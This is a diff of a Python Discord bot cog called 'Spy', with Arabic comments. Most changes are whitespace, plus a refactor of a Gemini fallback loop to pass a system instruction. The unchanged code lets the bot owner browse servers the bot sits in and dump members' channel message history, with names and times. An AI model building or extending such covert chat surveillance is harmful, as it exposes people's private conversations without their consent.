@@ -22,6 +22,7 @@ MODELS_FALLBACK = [
 OWNER_ID = 1107355943408259112
 MEMORY_TIMEOUT = 3600
 
+# نفس واجهات وسيرفرات التجسس القديمة (بدون تغيير)
 class ServerSelect(discord.ui.Select):
     def __init__(self, bot_instance):
         self.bot_instance = bot_instance
@@ -40,7 +41,6 @@ class ServerSelect(discord.ui.Select):
             return
 
         await interaction.response.defer(ephemeral=True)
-
         guild_id = int(self.values[0])
         guild = self.bot_instance.get_guild(guild_id)
 
@@ -160,7 +160,6 @@ class ChannelsListButton(discord.ui.Button):
             return
 
         await interaction.response.defer(ephemeral=True)
-
         all_channels = list(self.guild.text_channels)
         
         if not all_channels:
@@ -205,7 +204,6 @@ class ChannelSelectDropdown(discord.ui.Select):
             return
 
         await interaction.response.defer(ephemeral=True)
-
         channel_id = int(self.values[0])
         channel = interaction.client.get_channel(channel_id)
         if not channel:
@@ -228,16 +226,12 @@ class ChannelSelectDropdown(discord.ui.Select):
             async for msg in channel.history(limit=100, after=after_time, before=before_time, oldest_first=True):
                 if msg.author.bot:
                     continue
-                
                 author_name = msg.author.name
                 if msg.webhook_id:
                     author_name = f"[WebHook] {msg.author.name}"
-                
                 hour_str = msg.created_at.strftime('%H')
                 day_str = msg.created_at.strftime('%d')
-                
                 content = msg.content if msg.content else "[محتوى ميديا / امبد]"
-                
                 line = f"{author_name} ( س {hour_str} - يوم {day_str} ) : {content}\n"
                 messages_log.append(line)
         except Exception as e:
@@ -250,14 +244,12 @@ class ChannelSelectDropdown(discord.ui.Select):
 
         chunks = []
         current_chunk = f"📜 **سجل رسائل روم (#{channel.name}):**\n\n"
-        
         for line in messages_log:
             if len(current_chunk) + len(line) > 1900:
                 chunks.append(current_chunk)
                 current_chunk = line
             else:
                 current_chunk += line
-        
         if current_chunk:
             chunks.append(current_chunk)
 
@@ -279,12 +271,10 @@ class PagedChannelsView(discord.ui.View):
     def update_view(self):
         self.clear_items()
         self.add_item(ChannelSelectDropdown(self.pages[self.current_page_idx]))
-        
         if len(self.pages) > 1:
             prev_button = discord.ui.Button(style=discord.ButtonStyle.secondary, label="⬅ الصفحة السابقة", disabled=(self.current_page_idx == 0))
             prev_button.callback = self.prev_page_callback
             self.add_item(prev_button)
-
             next_button = discord.ui.Button(style=discord.ButtonStyle.secondary, label="الصفحة التالية ➡️", disabled=(self.current_page_idx == len(self.pages) - 1))
             next_button.callback = self.next_page_callback
             self.add_item(next_button)
@@ -422,28 +412,27 @@ class Spy(commands.Cog):
 
             for model_name in MODELS_FALLBACK:
                 try:
-                    current_model = genai.GenerativeModel(model_name)
+                    # ✅ الحل الجذري: تمرير system_instruction مباشرة للطريقة الصحيحة في المكتبة الحديثة
+                    current_model = genai.GenerativeModel(
+                        model_name=model_name,
+                        system_instruction=system_instruction
+                    )
                     
-                    full_chat_history = []
-                    full_chat_history.append({"role": "user", "parts": [system_instruction]})
-                    full_chat_history.append({"role": "model", "parts": ["تم فهم التعليمات وجاهز. / Instructions understood and ready."]})
-                    
-                    full_chat_history.extend(self.user_memory[user_id]["history"])
-                    full_chat_history.append({"role": "user", "parts": current_parts})
-
-                    chat_session = current_model.start_chat(history=full_chat_history[:-1])
+                    # إنشاء الـ chat session باستخدام الذاكرة البسيطة للنصوص فقط بدون حقن النظام داخل الهستوري
+                    chat_session = current_model.start_chat(history=self.user_memory[user_id]["history"])
                     response = chat_session.send_message(current_parts)
 
                     if response and hasattr(response, 'text') and response.text:
                         reply_text = response.text.strip()
                         
+                        # تحديث السجل للرسالة الحالية والرد
                         self.user_memory[user_id]["history"].append({"role": "user", "parts": current_parts})
                         self.user_memory[user_id]["history"].append({"role": "model", "parts": [reply_text]})
                         
-                        success = True
+                        success = true_val = True
                         break
                 except Exception as e:
-                    print(f"⚠️️ خطأ بالموديل {model_name}: {e}")
+                    print(f"⚠️ خطأ بالموديل {model_name}: {e}")
                     continue
 
             if success and reply_text:
